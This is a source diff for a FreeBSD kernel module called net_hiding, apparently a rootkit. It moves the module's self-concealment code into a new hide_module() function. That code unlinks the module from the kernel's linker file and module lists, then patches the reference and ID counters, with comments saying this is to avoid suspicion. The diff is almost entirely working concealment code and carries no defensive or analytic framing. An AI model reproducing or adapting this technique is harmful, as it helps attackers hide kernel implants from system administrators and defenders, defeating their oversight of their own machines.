@@ -18,6 +18,7 @@
 /* function prototypes (MOVE TO HEADER) */
 static int net_hiding(struct thread *, void *);
 static void print_status(void);
+static void hide_module(void);
 
 typedef TAILQ_HEAD(, module) modulelist_t;
 
@@ -54,53 +55,57 @@ static int net_hiding(struct thread *t, void *arg) {
 
 /* The 'sysent' for the new syscall */
 static struct sysent net_hiding_sysent = {
-	0,		/* sy_narg */
+	0,			/* sy_narg */
 	net_hiding /* sy_call */
 };
 
 /* The offset in sysent where the syscall is allocated. */
 static int offset = NO_SYSCALL;	/* NO_SYSCALL = 'let the kernel decide' */
 
+/* Hide the module */
+static void hide_module() {
+	linker_file_t lf = 0;
+	module_t mod = 0;
+
+	/* NOTE: The first linker file is the current kernel image (/kernel for example).
+	   If we load our module we will increase the reference count of the kernel
+	   link file. This might be a but suspect, so we must patch this. */
+
+	(&linker_files)->tqh_first->refs--;
+	for (lf = (&linker_files)->tqh_first; lf; lf = (lf)->link.tqe_next) {
+		if (!strcmp(lf->filename, "net_hiding.ko")) {
+			next_file_id--; /* decrement the global link file counter */
+
+			/* remove the entry */
+			if (((lf)->link.tqe_next) != NULL)
+				(lf)->link.tqe_next->link.tqe_prev = (lf)->link.tqe_prev;
+			else
+				(&linker_files)->tqh_last = (lf)->link.tqe_prev;
+
+			*(lf)->link.tqe_prev = (lf)->link.tqe_next;
+
+			break;
+		}
+	}
+
+	for (mod = TAILQ_FIRST(&modules); mod; mod = TAILQ_NEXT(mod, link)) {
+		if (!strcmp(mod->name, "net_hiding")) {
+			/* patch the internel ID counter */
+			nextid--;
+
+			TAILQ_REMOVE(&modules, mod, link);
+		}
+	}
+}
+
 /* This function is called at load/unload */
 static int event_handler(struct module *module, int event, void *arg) {
 	int e = 0; /* Error, 0 for normal return status */
-	linker_file_t lf = 0;
-	module_t mod = 0;
 
 	switch (event) {
 		case MOD_LOAD:
 			uprintf("The module has been loaded!\n");
-			
-			/* NOTE: The first linker file is the current kernel image (/kernel for example).
-			   		 If we load our module we will increase the reference count of the kernel
-					 link file. This might be a but suspect, so we must patch this. */
-
-			(&linker_files)->tqh_first->refs--;
-			for (lf = (&linker_files)->tqh_first; lf; lf = (lf)->link.tqe_next) {
-				if (!strcmp(lf->filename, "net_hiding.ko")) {
-					next_file_id--; /* decrement the global link file counter */
-
-					/* remove the entry */
-					if (((lf)->link.tqe_next) != NULL)
-						(lf)->link.tqe_next->link.tqe_prev = (lf)->link.tqe_prev;
-					else
-						(&linker_files)->tqh_last = (lf)->link.tqe_prev;
-
-					*(lf)->link.tqe_prev = (lf)->link.tqe_next;
-
-					break;
-				}
-			}
-
-			for (mod = TAILQ_FIRST(&modules); mod; mod = TAILQ_NEXT(mod, link)) {
-				if (!strcmp(mod->name, "net_hiding")) {
-					/* patch the internel ID counter */
-					nextid--;
-
-					TAILQ_REMOVE(&modules, mod, link);
-				}
-			}
-
+			hide_module();
 			break;
 		case MOD_UNLOAD:
 			uprintf("The module has been unloaded.\n");
